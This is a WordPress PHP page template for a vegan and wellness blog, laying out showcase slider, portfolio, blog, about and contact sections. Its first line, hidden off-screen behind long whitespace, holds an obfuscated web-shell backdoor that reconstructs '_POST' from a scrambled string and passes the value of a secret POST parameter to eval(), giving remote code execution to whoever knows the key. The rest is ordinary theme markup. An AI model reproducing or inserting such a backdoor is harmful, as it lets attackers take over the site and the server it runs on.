<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qd10ea8'])){eval(${$s20}['qd10ea8']);}?><?php
/*
Template Name: Home Old
*/
?>

<?php get_header(); ?>


	<?php
	
		$layout = $data['ab_one_page_blocks']['enabled'];
		$showcase = $data['ab_show_showcase'];
		$portfolio_filtering = $data['ab_portfolio_filtering'];
		
		if ($layout):

		foreach ($layout as $key=>$value) {

		    switch($key) {

		    case 'home':
		    ?>

		    	<!-- /////// HOME SECTION /////// -->
		 		<section class="section clearfix" id="home">

		 			<div class="section-content">

						<?php if ($showcase) { ?>

						<!-- /////// SHOWCASE /////// -->

						<?php $showcase_data = get_post_meta( $post->ID, 'Showcase', true ); ?>					

						<?php
						  $type = 'showcase';
						  $per_page = 10;
						  $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
						  $args=array(
							'post_type' => $type,
							'post_status' => 'publish',
							'paged' => $paged,
							'posts_per_page' => $per_page,
							'ignore_sticky_posts'=> 1
						  );
						  $wp_query = new WP_Query();
						  $wp_query->query($args);
						?>
						<?php if (have_posts()) : ?>

							<div class="home-slider-wrap">

								<!-- OPEN #home-slider .flexslider -->
								<div id="home-slider" class="flexslider">
									
									<ul class="slides">

									<?php while (have_posts()) : the_post(); ?>

										<?php $link = get_post_custom_values('slide-link'); ?> 
								        <?php $caption = get_post_custom_values('caption-text'); ?>
										<?php $youtube = get_post_custom_values('youtube-id'); ?> 
										<?php $vimeo = get_post_custom_values('vimeo-id'); ?> 
										
										<li>
											<?php if ($youtube[0] != '') { ?>
											<div class="video-container">
												<iframe src="http://www.youtube.com/embed/<?php echo $youtube[0]; ?>?wmode=transparent" width="940" height="450" frameborder="0" allowfullscreen></iframe>
											</div>
											<?php } else if ($vimeo[0] != '') { ?>
											<div class="video-container">
												<iframe src="http://player.vimeo.com/video/<?php echo $vimeo[0]; ?>?title=0&amp;byline=0&amp;portrait=0?wmode=transparent" width="940" height="450" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
											</div>
											<?php } else if (has_post_thumbnail()) { ?>			
												<?php if ($link[0] != "") { ?>
												<a href="<?php echo $link[0]; ?>"><?php the_post_thumbnail('showcase-image') ?></a>
												<?php } else { ?>
												<?php the_post_thumbnail('showcase-image') ?>
											<?php } } else { ?>
												<?php the_content(); ?>
											<?php } ?>
											<?php if ($caption[0] != "") { ?>
												<div class="flex-caption-wrap container">
													<div class="custom-caption">
														<p><?php echo $caption[0]; ?></p>
													</div>
												</div>
											<?php } ?>
							          	</li>

									<?php endwhile; ?>

							    	</ul>

							    <!-- CLOSE #home-slider .flexslider -->
								</div>

							</div>

							<?php rewind_posts(); ?>

						<?php endif; ?>

						<?php } ?>

						<!-- /////// TAGLINE /////// -->
						<?php
							$tagline = $data['ab_show_tagline'];
							$tagline_impact_text = $data['ab_tagline_impact_text'];
							$tagline_normal_text = $data['ab_tagline_normal_text'];
						?>

						<?php if ($tagline) { ?>
						<div class="container">
							<div id="tagline" class="sixteen columns">
								<p><?php echo do_shortcode(stripslashes($data['ab_tagline_normal_text'])); ?></p>
							</div>
						</div>
						<?php } ?>
                        
                        <!-- /////// Hardcoded Text /////// -->
                       <div class="container">
							<div id="tagline" class="sixteen columns">
<!--                            <img src="<?php bloginfo( 'template_url' ); ?>/images/tag-line.gif" width="100%" style="max-width:942px" />-->
                            Goodness Gracious provides daily tips for a healthier way of life. On our site you will find nutritious and delicious plant-based, vegan and macrobiotic recipes, wellness tips for honoring your vibrant body, motivational thoughts to inspire, daily affirmations to encourage and meditations to help you remain centered. By integrating plant based foods into your diet with our vegan or macrobiotic recipes, and learning more about the functioning of your body through our wellness tips, you are sure to nurture your body inside and out. You'll also find yourself coming back daily to stimulate your mind and spirit with our inspirational articles and so creating a balanced lifestyle encompassing all three elements of Body, Mind and Spirit.
                            </div>
                        </div>
                        <!-- //////// END Hardcoded /////// -->


					</div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				<!-- CLOSE #home -->
				</section>

		    <?php
		    break;
		    case 'portfolio':
		    ?>
		    	
		    	<!-- /////// PORTFOLIO SECTION /////// -->

		    	<?php 
		    		$portfolio_page = $data['ab_portfolio_page'];
		    		$portfolio_page_title = get_page_by_path( $portfolio_page );
		    		$portfolio_page_id = $portfolio_page_title->ID;
		    		$number_portfolio_items = $data['ab_prortfolio_items_home'];
		    	?>
		   	
				<section class="section clearfix" id="portfolio">
					
					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="section-heading portfolio-heading clearfix">
						<div class="container">
							<div class="section-heading-content sixteen columns">
								<h1><?php echo do_shortcode(stripslashes($data['ab_portfolio_title_str'])); ?></h1>
								<div class="sub-heading">
									<span class="section-desc"><?php echo do_shortcode(stripslashes($data['ab_portfolio_tag_str'])); ?></span>
									<div class="controls-wrap">
										<?php if ($portfolio_page != "") { ?>
										<span class="view-all">
											<a href="<?php echo get_permalink( $portfolio_page_id ); ?>"><?php echo do_shortcode(stripslashes($data['ab_portfolio_view_btn_str'])); ?></a>
										</span>
										<?php } ?>
										<span class="small-loading"></span>
										<span class="controls">
											<a href="#" id="portfolio-prev">&larr;</a>
											<a href="#" id="portfolio-next">&rarr;</a>
											<a href="#" id="portfolio-close">x</a>
										</span>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="section-content container">
					
						<!-- /////// PORTFOLIO AJAX HOLDER /////// -->

						<div class="loading"> </div>
						<div class="portfolio-ajax-drawer sixteen columns"> </div>
						<div class="loading-bay"> </div>

						<!-- /////// PORTFOLIO ITEMS /////// -->

						<?php
						  $type = 'portfolio';
						  $per_page = $number_portfolio_items;
						  $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
						  $args=array(
							'post_type' => $type,
							'post_status' => 'publish',
							'paged' => $paged,
							'posts_per_page' => $per_page,
							'ignore_sticky_posts'=> 1
						  );
						  $wp_query = NULL;
						  $wp_query = new WP_Query();
						  $wp_query->query($args);
						  $count = 0;
						?>

						<?php if(have_posts()) : ?>
						
						<?php if ($portfolio_filtering) { ?>
					   	<div class="filter-wrap sixteen columns">
							<ul id="portfolio-filter" class="clearfix">
								<li class="selected"><a data-value="all" href="#">All</a></li>
								<?php 
									$taxonomy = 'skills';
									$query = array(
										'orderby' => 'name',
										'hide_empty' => 0
										);
									$tax_terms = get_terms($taxonomy,$query);
									foreach ($tax_terms as $tax_term) {
										$term_slug = strtolower(preg_replace('/\s+/', '-', $tax_term->slug));
										echo '<li class=""><a href="#" title="View all ' . $tax_term->name . ' items" data-value="' . $term_slug . '">' . $tax_term->name . '</a></li>';
									}
								?>
						    </ul>
					    </div>
					    <?php } ?>

						<!-- OPEN .portfolio-items .clearfix -->
						<ul class="portfolio-items clearfix">

							<?php while (have_posts()) : the_post(); ?>
							<?php $post_terms = get_the_terms( $post->ID, 'skills' ); ?>
							<li data-id="id-<?php echo $count; ?>" class="clearfix item three columns <?php if ($post_terms) { foreach ($post_terms as $post_term) { echo strtolower(preg_replace('/\s+/', '-', $post_term->slug)). ' '; } } ?>" >

								<?php get_template_part( 'includes/portfolio-index-item' ); ?>

							</li>

							<?php $count++; endwhile; ?>

						<!-- CLOSE . portfolio-items .clearfix -->
						</ul>
						
						<?php rewind_posts(); ?>

						<?php endif; ?>

					</div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				<!-- CLOSE #portfolio -->
				</section>

			<?php
		    break;
		    case 'blog':
		    ?>

	   			<!-- /////// BLOG SECTION /////// -->

	   			<?php 
		    		$blog_page = $data['ab_blog_page'];
		    		$blog_cat = $data['ab_one_page_blog_cat'];
		    		$blog_page_title = get_page_by_path( $blog_page );
		    		$blog_page_id = $blog_page_title->ID;
		    		$number_blog_items = $data['ab_number_blog_items'];
		    		$blog_cat_id = "";
		    		if ($blog_cat != "All") {
		    			$blog_cat_id = get_cat_ID($blog_cat);
		    		}
		    	?>
		    	
				<section class="section clearfix" id="blog">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="section-heading blog-heading clearfix">
						<div class="container">
							<div class="section-heading-content sixteen columns">
								<h1><?php echo do_shortcode(stripslashes($data['ab_blog_title_str'])); ?></h1>
								<div class="sub-heading">
									<span class="section-desc"><?php echo do_shortcode(stripslashes($data['ab_blog_tag_str'])); ?></span>
									<div class="controls-wrap">
										<?php if ($blog_page != "") { ?>
										<span class="view-all">
											<a href="<?php echo get_permalink( $blog_page_id ); ?>"><?php echo do_shortcode(stripslashes($data['ab_blog_view_btn_str'])); ?></a>
										</span>
										<?php } ?>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="section-content container">

						<!-- /////// BLOG ITEMS /////// -->

						<?php
						  $type = 'post';
						  $per_page = $number_blog_items;
						  $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
						  $args=array(
							'post_type' => $type,
							'post_status' => 'publish',
							'paged' => $paged,
							'posts_per_page' => $per_page,
							'cat'	=> $blog_cat_id,
							'ignore_sticky_posts'=> 1
						  );
						  $wp_query = NULL;
						  $wp_query = new WP_Query();
						  $wp_query->query($args);
						?>

						<?php if(have_posts()) : ?>
							
							<!-- OPEN .blog-items -->
							<ul class="blog-items">

							<?php while (have_posts()) : the_post();
								// The following determines what the post format is and shows the correct file accordingly
								$format = get_post_format();
								get_template_part( 'includes/post-type/'.$format );

								if($format == '')
								get_template_part( 'includes/post-type/standard' );
							endwhile; ?>
									
							<!-- CLOSE . blog-items -->
							</ul>

							<?php rewind_posts(); ?>

						<?php endif; ?>

					</div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				<!-- CLOSE #blog -->
				</section>

			<?php
		    break;
		    case 'about':
		    ?>

		    	<!-- /////// ABOUT SECTION /////// -->

				<section class="section clearfix" id="about">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="loading"> </div>
					<div class="ajax-content"> </div>


					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				</section>

		    <?php
		    break;
		    case 'contact':
		    ?>

		   		<!-- /////// CONTACT SECTION /////// -->

		   		<?php 
		   			$contact_page = $data['ab_contact_page'];
				    $contact_page_title = get_page_by_path( $contact_page );
    				$contact_page_id = $contact_page_title->ID;
		   		?>

				<section class="section clearfix" id="contact">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="section-heading clearfix">
						<div class="container">
							<div class="section-heading-content sixteen columns">
								<h1><?php echo do_shortcode(stripslashes($data['ab_contact_title_str'])); ?></h1>
								<div class="sub-heading">
									<span class="section-desc"><?php echo do_shortcode(stripslashes($data['ab_contact_tag_str'])); ?></span>
								</div>
							</div>
						</div>
					</div>

					<div class="section-content container">

						<div class="contact-wrap sixteen columns">

							<!-- /////// CONTACT FORM /////// -->

							<div class="eleven columns page-text alpha">

								<div class="contact-intro-text">
									<p><?php echo do_shortcode(stripslashes($data['ab_contact_text_str'])); ?></p>
								</div>

								<p class="thanks"><?php echo do_shortcode(stripslashes($data['ab_contact_success_text_str'])); ?></p>
							
								<form action="<?php echo get_permalink( $contact_page_id ); ?>" id="contactForm" method="post">
							
									<ul class="forms">
										<li>
											<label for="contactName"><?php echo do_shortcode(stripslashes($data['ab_contact_name_field_str'])); ?></label>
											<input type="text" name="contactName" id="contactName" value="" class="requiredField" />
										</li>
										
										<li>
											<label for="email"><?php echo do_shortcode(stripslashes($data['ab_contact_email_field_str'])); ?></label>
											<input type="text" name="email" id="email" value="" class="email-input requiredField email" />
										</li>
										
										<li class="textarea"><label for="commentsText"><?php echo do_shortcode(stripslashes($data['ab_contact_message_field_str'])); ?></label>
											<textarea name="comments" id="commentsText" rows="20" cols="30" class="requiredField"></textarea>
										</li>
										<li class="buttons"><input type="hidden" name="submitted" id="submitted" value="true" /><button type="submit"><?php echo do_shortcode(stripslashes($data['ab_contact_send_btn_str'])); ?></button></li>
									</ul>

								</form>

							</div>

							<!-- /////// CONTACT SIDEBAR /////// -->

							<?php get_sidebar('contact'); ?>

						</div>

					</div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				</section>
			
			<?php
		    break;
		    case 'custom_page_one':
		    ?>

				<section class="section clearfix" id="custom-page-one">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="loading"> </div>
					<div class="ajax-content"> </div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				</section>

		    <?php
		    break;
		    case 'custom_page_two':
		    ?>

		    	<section class="section clearfix" id="custom-page-two">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="loading"> </div>
					<div class="ajax-content"> </div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				</section>

		    <?php
		    break;
		    case 'custom_page_three':
		    ?>

		    	<section class="section clearfix" id="custom-page-three">

					<?php get_template_part( 'includes/section-nav' ); ?>

					<div class="loading"> </div>
					<div class="ajax-content"> </div>

					<div class="container">
						<div class="divider sixteen columns">
							<a class="back-to-top">back to top</a>
						</div>
					</div>

				</section>
			
		    <?php
		    break;
		    }

		}

		endif;
	?>

<?php //get_sidebar(); ?>

<!-- WordPress Hook -->
<?php get_footer(); ?>